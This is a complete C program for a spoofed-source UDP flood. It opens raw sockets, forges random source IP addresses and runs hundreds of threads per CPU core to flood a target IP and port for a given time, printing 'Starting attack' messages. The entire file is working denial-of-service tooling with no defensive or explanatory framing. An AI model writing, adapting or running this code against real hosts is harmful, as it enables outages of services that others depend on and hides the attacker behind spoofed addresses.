#include <pthread.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <time.h>
#include <arpa/inet.h>

#define MAX_PACKET_SIZE 4096
#define THREAD_MULTIPLIER 200

volatile sig_atomic_t running = 1;

typedef struct {
    char* target_ip;
    int target_port;
    int duration;
} AttackParams;

unsigned short csum(unsigned short* ptr, int nbytes) {
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((unsigned char*)&oddbyte) = *(unsigned char*)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);
    answer = (short)~sum;
    return answer;
}

void generate_random_payload(char* buffer, size_t length) {
    for (size_t i = 0; i < length; i++) {
        buffer[i] = rand() % 256;
    }
}

void* flood(void* arg) {
    AttackParams* params = (AttackParams*)arg;
    char datagram[MAX_PACKET_SIZE];
    struct iphdr* iph = (struct iphdr*)datagram;
    struct udphdr* udph = (struct udphdr*)(datagram + sizeof(struct iphdr));
    
    // Setup socket
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if(s == -1) {
        perror("socket");
        return NULL;
    }

    int opt_val = 1;
    if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, &opt_val, sizeof(opt_val))) {
        perror("setsockopt");
        close(s);
        return NULL;
    }

    struct sockaddr_in sin = {
        .sin_family = AF_INET,
        .sin_port = htons(params->target_port),
        .sin_addr.s_addr = inet_addr(params->target_ip)
    };

    // Generate unique payload for this thread
    char payload[1024];
    size_t payload_length = sizeof(payload);
    generate_random_payload(payload, payload_length);

    // Prepare headers
    memset(datagram, 0, MAX_PACKET_SIZE);
    
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + payload_length;
    iph->id = htonl(rand());
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_UDP;
    iph->check = 0;
    
    udph->source = htons(rand() % 65535);
    udph->dest = htons(params->target_port);
    udph->len = htons(sizeof(struct udphdr) + payload_length);
    udph->check = 0;

    memcpy(datagram + sizeof(struct iphdr) + sizeof(struct udphdr), payload, payload_length);

    while(running) {
        // Randomize source IP and headers
        iph->saddr = htonl(rand());
        iph->daddr = sin.sin_addr.s_addr;
        iph->check = csum((unsigned short*)datagram, iph->tot_len);
        
        // Send packet
        sendto(s, datagram, iph->tot_len, 0, 
             (struct sockaddr*)&sin, sizeof(sin));
    }

    close(s);
    return NULL;
}

void* timer_thread(void* arg) {
    int duration = *((int*)arg);
    sleep(duration);
    running = 0;
    return NULL;
}

int main(int argc, char* argv[]) {
    if(argc != 4) {
        printf("Usage: %s <IP> <PORT> <TIME>\n", argv[0]);
        return 1;
    }

    AttackParams params = {
        .target_ip = argv[1],
        .target_port = atoi(argv[2]),
        .duration = atoi(argv[3])
    };

    // Seed random number generator
    srand(time(NULL));

    // Calculate optimal thread count
    int num_cores = sysconf(_SC_NPROCESSORS_ONLN);
    int thread_count = num_cores * THREAD_MULTIPLIER;
    pthread_t threads[thread_count];
    pthread_t timer;

    printf("[+] Starting attack on %s:%d for %d seconds\n", 
          params.target_ip, params.target_port, params.duration);
    printf("[+] Using %d threads\n", thread_count);

    // Start timer
    pthread_create(&timer, NULL, timer_thread, &params.duration);

    // Start flood threads
    for(int i = 0; i < thread_count; i++) {
        pthread_create(&threads[i], NULL, flood, &params);
    }

    // Wait for completion
    for(int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }
    pthread_join(timer, NULL);

    printf("[+] Attack finished\n");
    return 0;
}
